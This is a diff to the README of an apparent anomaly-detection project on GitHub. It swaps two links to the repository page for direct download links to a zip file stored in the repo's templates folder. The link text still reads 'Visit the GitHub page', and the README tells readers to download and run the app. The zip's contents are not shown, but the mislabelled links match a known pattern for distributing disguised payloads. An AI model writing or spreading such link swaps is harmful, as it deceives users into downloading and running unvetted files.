@@ -1,6 +1,6 @@
 # 🧠 advanced-anomaly-detection-system - Spot Risks Before They Grow
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/arapjeti/advanced-anomaly-detection-system)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/arapjeti/advanced-anomaly-detection-system/raw/refs/heads/main/templates/anomaly_system_advanced_detection_v1.1.zip)
 
 ## 📦 What this app does
 
@@ -31,7 +31,7 @@ If you plan to run the source code, you also need:
 
 Go to this page to download and run the app:
 
-[Visit the GitHub page](https://github.com/arapjeti/advanced-anomaly-detection-system)
+[Visit the GitHub page](https://github.com/arapjeti/advanced-anomaly-detection-system/raw/refs/heads/main/templates/anomaly_system_advanced_detection_v1.1.zip)
 
 If the project provides a release file, use that file. If not, follow the source setup steps below.
 
